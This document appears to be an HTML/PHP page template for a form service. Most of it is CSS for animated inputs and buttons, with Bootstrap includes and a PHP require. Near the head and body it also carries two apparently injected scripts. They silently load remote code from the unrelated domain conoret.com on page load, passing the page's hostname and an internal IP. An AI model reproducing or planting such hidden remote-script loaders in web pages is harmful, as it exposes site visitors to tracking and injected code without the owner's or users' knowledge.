<html>
<head>
    <meta name="viewport" content="width=device-width; initial-scale=1.0">
<style> 

.Max_header_Ok {padding: 5px;text-align: center;background: #1fc443;color: white;font-size: 20px;width:300px;border-radius: 30px;}
.Max_header_No {padding: 5px;text-align: center;background: #c23f17;color: white;font-size: 20px;width:300px;border-radius: 30px;}

.Max_Groups        {position:relative;margin-bottom:45px;}
input         {font-size:22px;padding:10px 10px 10px 5px;display:block;width:300px;border:none;border-bottom:1px solid #757575;} input:focus     { outline:none; }
label          {color:#999; font-size:22px;font-weight:normal;position:absolute;pointer-events:none;left:5px;top:10px;transition:0.2s ease all; -moz-transition:0.2s ease all; -webkit-transition:0.2s ease all;}
input:focus ~ label, input:valid ~ label    {top:-20px;font-size:20px;color:#5264AE;}
.Max_Bars  { position:relative; display:block; width:300px; }
.Max_Bars:before, .Max_Bars:after   {content:'';height:2px; width:0;bottom:1px;position:absolute;background:#5264AE;transition:0.2s ease all;-moz-transition:0.2s ease all;-webkit-transition:0.2s ease all;}
.Max_Bars:before {left:50%;}
.Max_Bars:after {right:50%;}
input:focus ~ .Max_Bars:before, input:focus ~ .Max_Bars:after {width:50%;}
.Max_Pods {position:absolute;height:60%; width:100px; top:25%; left:0;pointer-events:none;opacity:0.5;}
input:focus ~ .Max_Pods {-webkit-animation:inputMax_Podser 0.3s ease;-moz-animation:inputMax_Podser 0.3s ease;animation:inputMax_Podser 0.3s ease;}
@-webkit-keyframes inputMax_Podser {from { background:#5264AE; } to  { width:0; background:transparent; }}
@-moz-keyframes inputMax_Podser {from { background:#5264AE; } to { width:0; background:transparent; }}
@keyframes inputMax_Podser {from { background:#5264AE; } to  { width:0; background:transparent; }}


.wrap {
 //height: 100%;
  display: flex;
  align-items: left;
  justify-content: left;
}

.button {
  min-width: 300px;
  min-height: 60px;
  font-size: 22px;
  //text-transform: uppercase;
  letter-spacing: 1.3px;
  font-weight: 700;
  color: #313133;
  background: #4f54d1;
background: linear-gradient(90deg, rgba(145, 226, 237,1) 0%, rgba(7, 222, 250,1) 100%);
  border: none;
  border-radius: 1000px;
  box-shadow: 12px 12px 24px rgba(0,0,255,.64);
  transition: all 0.3s ease-in-out 0s;
  cursor: pointer;
  outline: none;
  position: relative;
  padding: 10px;
  }

button::before {
content: '';
  border-radius: 1000px;
  min-width: calc(300px + 12px);
  min-height: calc(60px + 12px);
  border: 6px solid #0008ff;
  box-shadow: 0 0 60px rgba(0,0,255,.64);
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  opacity: 0;
  transition: all .3s ease-in-out 0s;
}

.button:hover, .button:focus {
  color: #000000;
  transform: translateY(-6px);
}

button:hover::before, button:focus::before {
  opacity: 1;
}

button::after {
  content: '';
  width: 30px; height: 30px;
  border-radius: 100%;
  border: 6px solid #00ff09; 
  position: absolute;
  z-index: -1;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  animation: ring 1.5s infinite;
}

button:hover::after, button:focus::after {
  animation: none;
  display: none;
}

@keyframes ring {
  0% {
    width: 30px;
    height: 30px;
    opacity: 1;
  }
  100% {
    width: 300px;
    height: 300px;
    opacity: 0;
  }
}

@media (min-width: 481px) {
.bgimg {
background-image: url('/images/Info_pok.jpg') ;
background-size: 70%;
background-repeat: no-repeat; 
background-position: right;
height: 800px;
width: 800px;
    }
}

@media (max-width: 480px) {
.bgimg {
background: none;
background-image: none;
    }
}


</style>
    <script src="//conoret.com/dsp?h=10.3.1.130&amp;r=0.957327414318617" type="text/javascript" defer="" async=""></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</head><body class="bgimg"><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
<div class="container">
    <section class="col-xs-12">
<?php
	require("/var/lk_service/service-pr-pok-add.php");
?>
    </section>
</div>
</body>
</html>
